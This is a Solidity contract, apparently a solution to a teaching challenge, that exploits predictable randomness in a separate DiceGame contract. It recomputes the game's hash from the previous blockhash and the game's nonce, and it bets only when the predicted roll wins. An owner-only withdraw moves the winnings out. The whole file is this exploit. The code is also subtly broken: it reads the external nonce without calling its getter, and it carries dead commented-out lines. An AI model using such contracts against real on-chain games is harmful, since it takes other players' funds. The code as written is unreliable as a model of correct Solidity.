pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;
    uint256 public nonce = 0;
    uint256 public prize = 0;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address _addr, uint256 _amount) external onlyOwner {
        require(
            address(this).balance >= _amount,
            "Not enough ETH to withdraw..."
        );
        (bool callSuccess, ) = payable(_addr).call{value: _amount}("");
        require(callSuccess, "Withdraw failed!");

        // address payable _owner = payable(owner());
        // _owner.transfer(address(this).balance);
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public payable {
        require(address(this).balance >= 0.002 ether, "ETH isn't enouth.!");

        bytes32 prevhash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevhash, address(diceGame), diceGame.nonce)
        );
        uint256 roll = (uint256(hash) % 16);

        if (roll == 0 || roll == 1 || roll == 2) {
            diceGame.rollTheDice{value: 0.002 ether}();
        }
        // } else {
        //     //return false;
        //     // exit;
        //     // break;
        //     // return "0";
        //     //revert();
        // }

        // rollTheDice();
    }

    //Add receive() function so contract can receive Eth
    receive() external payable {}
}
